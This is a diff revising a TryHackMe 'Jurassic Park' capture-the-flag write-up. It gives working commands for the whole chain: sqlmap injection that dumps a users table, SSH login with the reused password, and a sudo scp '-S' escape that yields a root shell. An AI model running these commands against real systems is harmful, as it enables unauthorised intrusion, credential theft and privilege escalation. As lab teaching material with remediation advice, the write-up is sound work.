@@ -1,119 +1,167 @@
 # Jurassic Park — TryHackMe Writeup
 
 > **Room:** [Jurassic Park](https://tryhackme.com/room/jurassicpark) · **Difficulty:** Medium–Hard
-> **Category:** Web / SQL Injection · **Author of writeup:** 0xnyx
-> **Goal:** Enumerate the shop, extract credentials via SQL injection, and find the flags across the file system.
+> **Category:** Web / SQL Injection
+> **Author of writeup:** 0xnyx
+> **Goal:** Dump credentials from a shop via SQL injection, log in over SSH, and collect flags up to root.
 
-> ⚠️ In line with TryHackMe's write-up policy, **no flags, passwords, or cracked values are included** — only the methodology.
+> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/jurassicpark), **no flags, passwords, or cracked values are included** — only the method.
 
 ---
 
-## 1. Reconnaissance
+## How to read this writeup
+
+Each step: **Do** → **You get** → **Why / what next**. The chain is: find the SQLi → let sqlmap dump the users → reuse the password over SSH → find flags → GTFOBins privesc to root.
+
+---
+
+## Step 1 — Port scan
+
+**Do**
 
 ```bash
 nmap -sVC -T4 -Pn <TARGET>
 ```
 
-- **22/tcp** — OpenSSH 7.2p2 (Ubuntu)
-- **80/tcp** — Apache httpd 2.4.18 — *Jarassic Park*
+**You get**
 
-Directory brute force:
+```
+22/tcp open  ssh   OpenSSH 7.2p2 (Ubuntu)
+80/tcp open  http  Apache httpd 2.4.18 — "Jarassic Park"
+```
+
+**Why / what next** — SSH is open, so if we can find a password anywhere, we get a real shell. The website is the likely place to find one. Enumerate it.
+
+---
+
+## Step 2 — Map the shop (find the injection point)
+
+**Do** — Brute-force directories, then browse the shop.
 
 ```bash
 gobuster dir -u http://<TARGET>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
-# shop.php, item.php, index.php, assets/, robots.txt
 ```
 
-The home page points to an "online shop" (`shop.php`), which links to products via
-`item.php?id=1`, `?id=2`, `?id=3`. The `id` parameter is the obvious injection point.
+**You get**
 
-## 2. Finding the SQL injection
+```
+/index.php  /shop.php  /item.php  /robots.txt  /assets/
+```
 
-A single quote breaks the query — the MySQL error is hidden in an **HTML comment**:
+The homepage links to an "online shop" (`shop.php`), whose products are loaded via `item.php?id=1`, `?id=2`, `?id=3`.
+
+**Why / what next** — A numeric `id` parameter pulled straight from the URL into a product lookup is the textbook SQL-injection target. Test it next.
+
+---
+
+## Step 3 — Confirm the SQL injection
+
+**Do** — Append a single quote to break the query and look for an error. (The error here is hidden inside an HTML comment, so grep for it.)
 
 ```bash
 curl -s "http://<TARGET>/item.php?id=1'" | grep -i error
-# ... error in your SQL syntax ... near "%" at line N
 ```
 
-The error `near "%"` shows the query wraps our input with a wildcard (roughly
-`... LIKE '%$id%'`), and the page even trolls: *"Try SqlMap.. I dare you.."*.
+**You get**
 
-Manual exploitation is awkward here: standard comments (`-- -`, `#`) appear to be
-**filtered**, and the `id` value is used in more than one place in the query, so the trailing
-`%'` is hard to neutralise by hand. This is exactly the case where an automated tool shines.
+```
+... error in your SQL syntax ... near "%" at line N
+```
 
-## 3. Exploitation with sqlmap
+...and the page even trolls you: *"Try SqlMap.. I dare you.."*.
+
+**Why / what next** — An SQL error = confirmed injection. The error `near "%"` tells us our input is wrapped in wildcards, roughly `... LIKE '%$id%'`. That matters: the `id` is used **inside a `LIKE` with a trailing `%'`**, and standard comments (`-- -`, `#`) appear **filtered**, so neutralising the query by hand is painful. This is exactly where an automated tool wins — and the room is literally daring us to use sqlmap.
+
+---
+
+## Step 4 — Dump the database with sqlmap
+
+**Do** — Point sqlmap at the parameter and enumerate the databases. `--batch` = accept defaults, no prompts.
 
 ```bash
 sqlmap -u "http://<TARGET>/item.php?id=1" --batch --dbs
 ```
 
-sqlmap confirms the parameter is injectable (boolean-based, error-based, and time-based) and
-lists the databases. The custom one serving the shop is **`park`** (answering the "name of the
-SQL database" question).
+**You get** — sqlmap confirms the parameter is injectable (boolean-based, error-based, **and** time-based) and lists the databases; the custom one serving the shop is **`park`** (this answers the room's "name of the SQL database" question).
 
-Enumerate tables and columns:
+**Why / what next** — We have the database name. Now drill into its tables and columns to find where credentials live.
 
 ```bash
 sqlmap -u "http://<TARGET>/item.php?id=1" --batch -D park --tables
 sqlmap -u "http://<TARGET>/item.php?id=1" --batch -D park --columns
 ```
 
-- `items` — **5 columns** (id, information, package, price, sold) — the shop table.
-- `users` — id, username, password.
+**You get**
 
-Dump the credentials:
+- `items` — **5 columns** (id, information, package, price, sold) → the shop table (answers the "columns in items" question).
+- `users` — id, username, password → the prize.
+
+**Do** — Dump the users table.
 
 ```bash
 sqlmap -u "http://<TARGET>/item.php?id=1" --batch -D park -T users --dump
 ```
 
-Two password hashes/strings come back. One of them is clearly **Dennis'** (the Jurassic Park
-saboteur Dennis Nedry — the password is thematic, "I hate dinosaurs" style).
+**You get** — Usernames and passwords. One account clearly belongs to **Dennis** (Dennis Nedry, the Jurassic Park saboteur — his password is thematic, in the "I hate dinosaurs" vein).
 
-## 4. SSH as dennis
+**Why / what next** — We have a username + password. SSH is open (Step 1). People reuse passwords — so try it over SSH.
 
-Credentials are reused for SSH:
+---
+
+## Step 5 — SSH in and collect the user-level flags
+
+**Do** — Log in as dennis with the dumped password.
 
 ```bash
-ssh dennis@<TARGET>        # password from the users table
-id                         # uid=1001(dennis)
+ssh dennis@<TARGET>
+id                          # uid=1001(dennis)
 grep PRETTY /etc/os-release # Ubuntu 16.04 — answers the "system version" question
 ```
 
-Collect the flags reachable as `dennis`:
+**You get** — A shell as `dennis`.
+
+**Do** — Collect the flags reachable as this user. Always check `.bash_history` — people leave secrets there.
 
 ```bash
-cat ~/flag1.txt                         # flag 1 (home directory)
-cat /boot/grub/fonts/flagTwo.txt        # flag 2
-cat ~/.bash_history                     # flag 3 is hidden in command history
+cat ~/flag1.txt                    # flag 1 (home dir)
+cat /boot/grub/fonts/flagTwo.txt   # flag 2
+cat ~/.bash_history                # flag 3 is hidden in command history
 ```
 
-> Always read `.bash_history` — secrets and flags are routinely left there.
+**Why / what next** — Three flags down. For the last one (in `/root/`) we need root. Run the first privesc check.
 
-## 5. Privilege escalation — sudo scp (GTFOBins)
+---
+
+## Step 6 — Privilege escalation to root (sudo scp, GTFOBins)
+
+**Do**
 
 ```bash
 sudo -l
-# (ALL) NOPASSWD: /usr/bin/scp
 ```
 
-`scp` can run as root without a password, and its `-S` option lets you specify the program
-used for the "SSH" transport — which then runs **as root** ([GTFOBins: scp](https://gtfobins.github.io/gtfobins/scp/)):
+**You get**
+
+```
+(ALL) NOPASSWD: /usr/bin/scp
+```
+
+**Why / what next** — `scp` can run as root without a password. On its own `scp` just copies files, but its `-S` option lets you specify the program used as the "SSH" transport — and that program then runs **as root** ([GTFOBins: scp](https://gtfobins.github.io/gtfobins/scp/)). So we point `-S` at a tiny script of our own.
+
+**Do**
 
 ```bash
 TF=$(mktemp)
-echo 'sh 0<&2 1>&2' > $TF      # or any commands you want root to run
+echo 'sh 0<&2 1>&2' > $TF      # or: cp /root/flag5.txt /tmp/f; chmod 666 /tmp/f
 chmod +x $TF
 sudo scp -S $TF x y:
 ```
 
-> Note: `scp` consumes the helper's stdout as part of its protocol, so for a non-interactive
-> grab, have the helper **write to a world-readable file** (e.g. copy `/root/flag5.txt` to
-> `/tmp` and `chmod 666` it) instead of printing to the terminal.
+> **Gotcha:** `scp` consumes the helper's stdout as part of its own protocol, so an interactive shell can misbehave. For a clean grab, make the helper **copy the root flag to a world-readable file** (e.g. `/tmp`, then `chmod 666`) instead of spawning a shell.
 
-This yields root and the final flag in `/root/flag5.txt`.
+**You get** — Code execution as root → read `/root/flag5.txt`.
+
+**Why / what next** — Root achieved, final flag collected. Box complete.
 
 ---
 
@@ -129,19 +177,19 @@ This yields root and the final flag in `/root/flag5.txt`.
 
 ## Lessons
 
-- A SQL error hidden in an HTML comment is still a confirmed injection — read the page source.
-- When comments are filtered / the parameter is reused in multiple clauses, **sqlmap** (error/boolean/time-based) beats fighting the query by hand.
+- An SQL error hidden in an **HTML comment** is still a confirmed injection — read the raw page source.
+- When comments are filtered / the parameter is reused in a `LIKE`, **sqlmap** (error/boolean/time-based) beats fighting the query by hand.
 - **Credential reuse**: DB passwords often unlock SSH.
-- Check `.bash_history` for leaked secrets.
+- Always read `.bash_history` for leaked secrets.
 - **GTFOBins** `sudo scp -S <script>` runs an arbitrary program as root.
 
 ## Remediation
 
 - Use parameterized queries / prepared statements; never concatenate input into SQL.
-- Don't expose DB errors to clients, even in comments.
+- Don't expose DB errors to clients, even inside comments.
 - Don't reuse the same password between the database and system accounts.
-- Clear shell history of secrets; store credentials in a secrets manager.
-- Avoid `NOPASSWD` sudo on binaries with escape vectors (see GTFOBins).
+- Clear shell history of secrets; use a secrets manager.
+- Avoid `NOPASSWD` sudo on binaries with escape vectors (check GTFOBins).
 
 ---
 
